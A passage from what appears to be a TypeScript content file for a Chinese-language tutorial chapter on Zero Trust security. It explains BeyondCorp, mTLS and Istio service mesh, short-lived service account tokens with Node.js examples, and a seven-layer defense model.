  - Just-Enough-Access（JEA）：只授予完成任務所需的最小操作集
  - 定期輪換憑證和密鑰（Credential Rotation）

原則三：假設已被入侵（Assume Breach）
  - 設計時假設攻擊者已在內部，縮短爆破半徑（Blast Radius）
  - 網路微分段（Micro-segmentation）：限制橫向移動範圍
  - 端對端加密：即使在「內部」也加密傳輸
  - 完整的稽核日誌（Audit Log）和異常偵測（UEBA）</code></pre>

  <h3>BeyondCorp 設計（Google 的 Zero Trust 實踐）</h3>
  <pre data-lang="text"><code class="language-text">BeyondCorp 模型（Google 2014 年開始推行）：

傳統 VPN 模型：
  Internet → [VPN Gateway] → 內網 → 應用
  一旦連上 VPN，內部資源全部可存取

BeyondCorp 模型：
  Internet → [Access Proxy（身份感知代理）] → 應用
  每次請求都需要：
    1. 用戶身份驗證（Google SSO）
    2. 設備身份驗證（設備憑證，由公司管理的設備才有）
    3. 設備健康狀態（MDM 確認：是否更新到最新系統、是否有防毒）
    4. 存取策略評估（用戶+設備組合是否有權存取此應用）

Context-Aware Access 決策示例：
  允許：公司管理的 Mac + 最新系統 + 工程師角色 → 存取生產環境控制台
  拒絕：個人設備（未受 MDM 管理）→ 不允許存取生產環境
  限制：公司設備但系統過期 → 只允許存取低敏感應用，並顯示更新提示

Google Cloud BeyondCorp Enterprise（商業版）：
  - Identity-Aware Proxy（IAP）：在應用前加一層身份感知代理
  - Access Context Manager：定義存取等級和策略
  - 不需要 VPN，從任何地方都能安全存取</code></pre>

  <h3>mTLS（Mutual TLS）服務間認證</h3>
  <pre data-lang="text"><code class="language-text">一般 TLS（單向）：
  Client ──[ClientHello]──► Server
  Server ──[Certificate: server.crt]──► Client
  Client 驗證：server.crt 是否由受信任的 CA 簽發
  Client ──[加密的請求]──► Server（Server 不驗證 Client 身份）

mTLS（雙向）：
  Client ──[ClientHello]──► Server
  Server ──[Certificate: server.crt]──► Client
  Server ──[CertificateRequest]──► Client（要求提供憑證）
  Client ──[Certificate: client.crt]──► Server
  Server 驗證：client.crt 是否由公司內部 CA 簽發
  → 確保「只有持有有效憑證的服務才能呼叫我」

在 Kubernetes 中實現 mTLS（使用 Istio Service Mesh）：
  - 每個 Pod 自動注入 Sidecar Proxy（Envoy）
  - Istiod 作為 Certificate Authority，自動頒發和輪換服務憑證
  - 所有服務間通訊自動加密並驗證身份（SPIFFE/SPIRE 標準）
  - 支援 mTLS 策略：STRICT（強制）、PERMISSIVE（過渡期，允許明文）
  - 完全透明：應用程式程式碼無需修改</code></pre>

  <pre data-lang="typescript"><code class="language-typescript">// mTLS 設定範例（Node.js）
import https from 'https';
import fs from 'fs';

// 服務端：要求客戶端提供憑證
const server = https.createServer({
  key: fs.readFileSync('server.key'),          // 服務端私鑰
  cert: fs.readFileSync('server.crt'),         // 服務端憑證
  ca: fs.readFileSync('internal-ca.crt'),      // 內部 CA 憑證（用於驗證客戶端）
  requestCert: true,                           // 要求客戶端提供憑證
  rejectUnauthorized: true,                    // 拒絕沒有有效憑證的連接
}, app);

// 在應用層進一步驗證客戶端身份
app.use((req, res, next) => {
  const clientCert = (req.socket as TLSSocket).getPeerCertificate();
  if (!clientCert || !clientCert.subject) {
    return res.status(401).json({ error: 'No client certificate' });
  }
  // 驗證 Common Name（服務名稱）是否在允許列表中
  const serviceName = clientCert.subject.CN;
  const allowedServices = ['payment-service', 'order-service'];
  if (!allowedServices.includes(serviceName)) {
    return res.status(403).json({ error: \`Service \${serviceName} not authorized\` });
  }
  req.callerService = serviceName;
  next();
});</code></pre>

  <h3>Service Account 管理</h3>
  <pre data-lang="typescript"><code class="language-typescript">// 服務間呼叫：每個請求都帶上短效 Service Account Token
// 避免使用長效 API Key（洩漏後難以追蹤和撤銷）

// Workload Identity（雲端原生方式）
// 在 GKE/EKS 上：Pod 自動獲得 Service Account 的身份
// 無需手動管理憑證，由雲端平台負責

// 應用層面的實作
class ServiceAccountTokenManager {
  private tokenCache = new Map<string, { token: string; expiresAt: number }>();

  async getToken(audience: string): Promise<string> {
    const cached = this.tokenCache.get(audience);
    // Token 有效期剩餘超過 30 秒才使用快取
    if (cached && cached.expiresAt > Date.now() + 30_000) {
      return cached.token;
    }

    // 從平台（GCP Metadata Server / AWS IMDS）獲取身份 Token
    const token = await this.fetchTokenFromPlatform(audience);
    this.tokenCache.set(audience, {
      token,
      expiresAt: Date.now() + 3_600_000, // 1 小時
    });
    return token;
  }

  // 服務間呼叫的標準模式
  async callService(serviceName: string, path: string, body: unknown) {
    const token = await this.getToken(\`https://\${serviceName}.internal\`);
    const traceId = generateTraceId();

    const response = await fetch(\`https://\${serviceName}.internal\${path}\`, {
      method: 'POST',
      headers: {
        'Authorization': \`Bearer \${token}\`,
        'X-Request-ID': traceId,
        'X-Caller-Service': 'my-service-name',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      throw new Error(\`Service call failed: \${response.status}\`);
    }
    return response.json();
  }
}</code></pre>

  <callout-box type="info" title="Service Mesh 與 Zero Trust">
    <p>Istio、Linkerd 等 Service Mesh 工具可以在基礎設施層自動實現 mTLS、存取策略和稽核日誌，讓開發者無需在每個服務中手動實作這些安全機制。這是現代雲原生架構實現 Zero Trust 的主流方式。結合 OPA（Open Policy Agent）可以實現細粒度的服務間授權策略管理。</p>
  </callout-box>

  <h3>Zero Trust 的分層防禦</h3>
  <pre data-lang="text"><code class="language-text">防禦層次（由外到內，每層獨立驗證）：
┌─────────────────────────────────────────────────────────┐
│  Layer 1: 邊界安全（DDoS 防護、WAF、API Gateway 限流）  │
├─────────────────────────────────────────────────────────┤
│  Layer 2: 身份驗證（MFA、SSO、Passkey/WebAuthn）        │
├─────────────────────────────────────────────────────────┤
│  Layer 3: 設備信任（MDM、設備健康狀態、Endpoint DLP）   │
├─────────────────────────────────────────────────────────┤
│  Layer 4: 網路存取（BeyondCorp IAP，廢除傳統 VPN）      │
├─────────────────────────────────────────────────────────┤
│  Layer 5: 應用授權（RBAC/ABAC，細粒度權限控制）         │
├─────────────────────────────────────────────────────────┤
│  Layer 6: 服務間認證（mTLS, Service Account Token）     │
├─────────────────────────────────────────────────────────┤
│  Layer 7: 資料安全（靜態加密、傳輸加密、DLP 策略）      │
└─────────────────────────────────────────────────────────┘
稽核日誌貫穿所有層次：SIEM + UEBA 持續分析異常行為

爆破半徑（Blast Radius）最小化：
  即使 Layer N 被突破，Layer N+1 仍然阻擋橫向移動
  某個服務被入侵 ≠ 所有服務都被入侵（微分段隔離）</code></pre>
</section>
`,
} satisfies ChapterContent;
